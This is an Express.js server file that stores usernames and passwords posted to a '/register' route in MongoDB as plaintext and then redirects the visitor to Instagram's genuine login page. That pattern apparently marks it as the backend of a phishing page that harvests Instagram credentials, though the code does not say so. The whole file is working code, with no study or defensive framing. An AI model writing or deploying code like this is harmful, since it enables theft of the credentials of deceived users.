const express = require('express');
const mongoose = require('mongoose'); // Import mongoose for MongoDB connection
const cookieParser = require('cookie-parser');
const path = require('path');
require('dotenv').config(); // Correctly load environment variables

// Import the user model (ensure it uses the existing Mongoose connection)
const userModel = require('./models/user');

// Create an Express app
const app = express();

// Middleware and settings
app.set('view engine', 'ejs');
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

// MongoDB connection URI from environment variables
const MONGO_URI = process.env.MONGO_URI;

// Ensure only one connection to MongoDB
if (!mongoose.connection.readyState) {
  mongoose
    .connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB Atlas!'))
    .catch((err) => {
      console.error('Error connecting to MongoDB:', err);
      process.exit(1); // Exit the application if the connection fails
    });
}


// Route to render the homepage
app.get('/', (req, res) => {
  res.render('index');
});

// Route to register a new user
app.post('/register', async (req, res) => {
  const { username, password } = req.body;

  try {
    // Create and save new user
    const newUser = await userModel.create({ username, password });

    // Redirect to the Instagram login page after successful registration
    res.redirect('https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav');
  } catch (error) {
    console.error(error);
    res.status(500).send('An error occurred while registering the user.');
  }
});

// Route to render the feed
app.get('/feed', (req, res) => {
  res.render('feed');
});

// Route to handle logout (no session management logic implemented)
app.get('/logout', (req, res) => {
  res.redirect('/');
});

// Start the server on the port provided by Render or default to 3000
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
